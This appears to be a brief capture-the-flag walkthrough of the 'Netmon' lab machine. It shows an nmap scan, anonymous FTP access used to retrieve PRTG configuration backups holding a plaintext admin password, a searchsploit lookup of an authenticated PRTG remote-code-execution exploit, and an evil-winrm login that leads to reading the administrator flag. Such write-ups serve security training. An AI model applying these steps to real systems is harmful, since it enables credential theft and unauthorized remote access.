
### Initial access

```
PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


```
Ftp recon 
```
229 Entering Extended Passive Mode (|||50042|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
09-06-26  08:19AM                   34 user.txt
226 Transfer complete.
ftp> cat user.txt

```
After research i found path ptgr store their password
 ```
 ftp> cd "/ProgramData/Paessler/PRTG Network Monitor/"
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50465|)
125 Data connection already open; Transfer starting.
09-06-26  09:02AM       <DIR>          Configuration Auto-Backups
09-06-26  08:29AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
09-06-26  08:29AM       <DIR>          Logs (Web Server)
09-06-26  08:29AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
09-06-26  09:01AM              1673031 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get "PRTG Configuration.dat"
ftp> get "PRTG Configuration.old"
ftp> get "PRTG Configuration.old.bak"

 cat PRTG Configuration.old.bak
             <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>

 
 ```

We change password to `PrTg@dmin2019` for the year of the box
We searching exploit
```
──(kali㉿kali)-[~/HTB/Netmon]
└─$ searchsploit prtg                
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                        | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                       | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                                    | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                     | java/webapps/34108.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Netmon]
└─$ searchsploit -m windows/webapps/46527.sh

  Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46527
     Path: /usr/share/exploitdb/exploits/windows/webapps/46527.sh
    Codes: CVE-2018-9276
 Verified: False
File Type: Bourne-Again shell script, ASCII text executable, with very long lines (2429)
Copied to: /home/kali/HTB/Netmon/46527.sh
```
We got access
```
┌──(kali㉿kali)-[~/HTB/Netmon]
└─$ evil-winrm -i  10.129.40.192    -u pentest   -p 'P3nT3st!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pentest\Documents> 

```
### Priv escalation
Get root
```
*Evil-WinRM* PS C:\users\Administrator\desktop> ls


    Directory: C:\users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/6/2026   9:56 AM             34 root.txt


*Evil-WinRM* PS C:\users\Administrator\desktop> cat root.txt
```
